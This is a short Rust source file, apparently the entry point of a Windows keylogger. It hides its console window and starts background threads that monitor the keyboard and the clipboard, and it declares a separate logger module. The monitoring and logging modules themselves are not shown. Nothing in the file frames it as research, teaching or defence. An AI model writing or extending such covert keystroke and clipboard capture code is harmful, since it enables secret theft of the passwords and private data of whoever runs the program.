#![windows_subsystem = "windows"]

mod clipboard;
mod keyboard;
mod logger;

use std::thread;
use std::time::Duration;

fn main() {
    let clipboard_thread = thread::spawn(|| {
        clipboard::monitor_clipboard();
    });

    let keyboard_thread = thread::spawn(|| {
        keyboard::monitor_keyboard();
    });

    loop {
        thread::sleep(Duration::from_secs(1));
    }
}
